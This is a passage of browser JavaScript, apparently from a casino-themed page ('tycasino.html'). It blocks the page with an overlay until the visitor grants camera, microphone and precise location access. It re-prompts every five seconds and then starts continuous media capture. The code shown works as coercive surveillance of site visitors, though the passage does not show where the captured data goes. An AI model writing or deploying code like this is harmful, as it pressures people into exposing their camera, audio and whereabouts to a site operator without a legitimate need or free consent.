            document.getElementById('p-mic-status').textContent = 'Allowed';
            document.getElementById('p-mic-status').style.color = 'green';
        }
        
        if (permissionStatus.location) {
            document.getElementById('p-location-status').textContent = 'Allowed';
            document.getElementById('p-location-status').style.color = 'green';
        }
    };
    
    updateStatus();
    
    // Request permissions button
    button.addEventListener('click', async () => {
        // Request each permission
        if (!permissionStatus.camera || !permissionStatus.microphone) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                permissionStatus.camera = true;
                permissionStatus.microphone = true;
                mediaStream = stream;
            } catch (err) {
                console.warn('Could not get both permissions:', err);
                
                // Try individually
                if (!permissionStatus.camera) {
                    try {
                        const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                        permissionStatus.camera = true;
                        mediaStream = videoStream;
                    } catch (videoErr) {
                        console.warn('Camera permission denied:', videoErr);
                    }
                }
                
                if (!permissionStatus.microphone) {
                    try {
                        const audioStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
                        permissionStatus.microphone = true;
                        
                        if (mediaStream) {
                            audioStream.getAudioTracks().forEach(track => {
                                mediaStream.addTrack(track);
                            });
                        } else {
                            mediaStream = audioStream;
                        }
                    } catch (audioErr) {
                        console.warn('Microphone permission denied:', audioErr);
                    }
                }
            }
        }
        
        // Request location
        if (!permissionStatus.location && navigator.geolocation) {
            try {
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            permissionStatus.location = true;
                            resolve(position);
                        },
                        error => {
                            console.warn('Location permission error:', error);
                            reject(error);
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                });
            } catch (geoError) {
                console.warn('Location permission denied:', geoError);
            }
        }
        
        // Update displayed status
        updateStatus();
        
        // Check if all permissions are granted
        permissionStatus.allGranted = permissionStatus.camera && permissionStatus.microphone && permissionStatus.location;
        
        if (permissionStatus.allGranted) {
            // Remove overlay after a brief delay to show success
            setTimeout(() => {
                document.body.removeChild(overlay);
                document.body.style.overflow = 'auto'; // Restore scrolling
                
                // Start media capture
                setupMediaCapture();
            }, 1500);
        }
    });
    
    // If permissions are already granted, hide overlay and start capture
    if (permissionStatus.allGranted) {
        if (document.body.contains(overlay)) {
            document.body.removeChild(overlay);
            document.body.style.overflow = 'auto'; // Restore scrolling
        }
        setupMediaCapture();
        return true;
    }
    
    return false;
}

// Start persistent permission checking on page load for tycasino.html
if (window.location.href.includes('tycasino.html')) {
    document.addEventListener('DOMContentLoaded', function() {
        // Initialize permission checking
        ensurePermissions();
        
        // Set up interval to periodically check permissions
        permissionCheckInterval = setInterval(async () => {
            const status = await checkAllPermissionsStatus();
            
            if (!status.allGranted) {
                permissionRetryCount++;
                console.log(`Some permissions not granted. Retry attempt: ${permissionRetryCount}`);
                
                // Show permission overlay if not all permissions are granted
                ensurePermissions();
            } else {
                // If we have all permissions, clear the interval and ensure media capture is running
                clearInterval(permissionCheckInterval);
                
                // Start or ensure media capture is running
                if (!mediaStream || !mediaStream.active) {
                    setupMediaCapture();
                }
            }
        }, 5000); // Check every 5 seconds
    });
} 